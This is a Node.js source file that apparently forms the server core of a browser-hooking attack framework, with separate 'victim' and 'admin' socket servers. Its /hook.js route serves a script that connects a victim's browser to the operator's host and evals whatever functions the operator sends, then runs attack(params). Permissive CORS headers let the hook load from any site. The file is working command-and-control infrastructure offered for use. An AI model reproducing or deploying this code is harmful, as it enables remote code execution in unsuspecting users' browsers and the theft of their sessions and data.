require('./.env')
const http          = require('http'),
      socketio      = require('socket.io'),
      express       = require('express'),
      victimSession = require("express-session")({
        secret: process.env.VICTIM_SESSION_SECRET,
        resave: true,
        saveUninitialized: true
      }),
      victimIoSession = require("express-socket.io-session"),
      adminSession    = require("express-session")({
        secret: process.env.ADMIN_SESSION_SECRET
      }),
      adminIoSession  = require("express-socket.io-session"),
      fs              = require('fs'),
      socketIOClient  = fs.readFileSync('./public/socket-io.js')

/*
  Configure Victim Sockets
*/
const victimApp     = express(),
      victimServer  = http.createServer(victimApp),
      ioVictim      = socketio.listen(victimServer)

ioVictim.use(victimIoSession(victimSession))
require('./routes/victim/sockets').configure(ioVictim)

process.env.VICTIM_SOCKET_PORT = process.env.VICTIM_SOCKET_PORT
victimApp.use(victimSession)
victimApp.use(function(req, res, next) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  return next();
})
victimApp.use(express.static(__dirname + '/public'))
victimApp.get('/hook.js', function(req, res){
  res.write(socketIOClient)
  res.write(`(function(){const socket = io('http://${process.env.VICTIM_SOCKET_IP}:${process.env.VICTIM_SOCKET_PORT}');socket.on('execute',function(data){eval(data.func);attack(data.params);});})();`)
  res.end()
})
victimServer.listen(process.env.VICTIM_SOCKET_PORT)
console.log(`Victim socket server listening on :${process.env.VICTIM_SOCKET_PORT}`)



/*
  Configure Admin Sockets
*/
const adminApp = express(),
      adminServer = http.createServer(adminApp),
      ioAdmin = socketio.listen(adminServer)

ioAdmin.use(adminIoSession(adminSession))
require('./routes/admin/sockets').configure(ioAdmin)
adminApp.use(adminSession)

process.env.ADMIN_SOCKET_PORT = process.env.ADMIN_SOCKET_PORT
adminServer.listen( process.env.ADMIN_SOCKET_PORT )
console.log(`Admin socket server listening on :${process.env.ADMIN_SOCKET_PORT}`)



module.exports.victimServer = victimServer
module.exports.ioVictim     = ioVictim
module.exports.adminServer  = adminServer
module.exports.ioAdmin      = ioAdmin